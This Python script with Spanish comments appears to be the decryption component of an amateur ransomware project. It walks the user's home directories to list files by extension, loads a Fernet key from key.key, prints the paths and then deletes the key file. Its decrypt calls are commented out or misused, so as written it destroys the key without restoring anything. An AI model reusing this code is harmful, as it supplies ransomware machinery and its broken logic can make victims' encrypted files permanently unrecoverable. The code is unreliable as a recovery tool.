from cryptography.fernet import Fernet
import os

home = os.environ.get('USERPROFILE') or os.environ.get('HOME')
#print(home)
carpetas = os.listdir(home)
carpetas = [x for x in carpetas if not x.startswith('.')]

extensiones = []

def returnKey():
    return open('key.key', 'rb').read()

def desencrypt(items, key):
    i = Fernet(key)
    for item in items:
        with open(item,'rb') as file:
            file_data = file.read()
        data = i.decrypt(file_data)
        with open(item,'wb') as file:
            file.write(data)

def discover():
        file_list = open('file_list.txt', 'w+',encoding='utf-8')  # sin extension para no tener problemas
        for carpeta in carpetas:
            rutaabs = home + '/' + carpeta  # rutasabs de carpetas
            rutaabs = os.path.normpath(rutaabs)  # verifica que sea coherente dependiendo del s.o
            # print(rutaabs)

            for extension in extensiones:
                for rutaabs, directorio, archivo in os.walk(rutaabs):
                    for file in archivo:
                        if file.endswith(extension):
                            file_list.write(os.path.join(rutaabs, file) + '\n')

        file_list.close()

if __name__ == '__main__':
       # home = 'C:\\Users\\mati_\\OneDrive\\Escritorio\\ataque'
      #  carpetas = os.listdir(home)
      #  archive = [home + "\\" + x for x in carpetas]
       # print(carpetas)
        discover()
        key = returnKey()

        list = open('file_list.txt', 'r')
        list = list.read().split('\n')
        list = [l for l in list if not l == ""]

        for lista in list:
            print(lista)
            #desencrypt(lista,key)

        os.remove('key.key')
        #desencrypt(archive, key)
        #os.remove('key.key')


